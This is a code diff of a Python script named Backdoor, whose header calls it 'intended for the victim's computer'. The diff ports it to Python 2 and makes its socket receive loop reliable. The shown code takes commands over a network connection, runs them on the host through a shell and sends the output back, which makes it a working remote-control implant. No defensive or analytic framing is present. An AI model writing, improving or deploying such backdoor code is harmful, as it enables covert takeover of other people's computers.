@@ -1,6 +1,6 @@
-#! /usr/bin/env python
+#!python2
 # NOTICE: this script is intended for the victim's computer.
-# Compatibility: Python 3 only.
+# Compatibility: Python 2 only. For now.
 
 import json
 import socket
@@ -14,11 +14,16 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode(errors="replace"))
+        self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = self.connection.recv(1024).decode(errors="replace")
-        return json.loads(json_data)
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
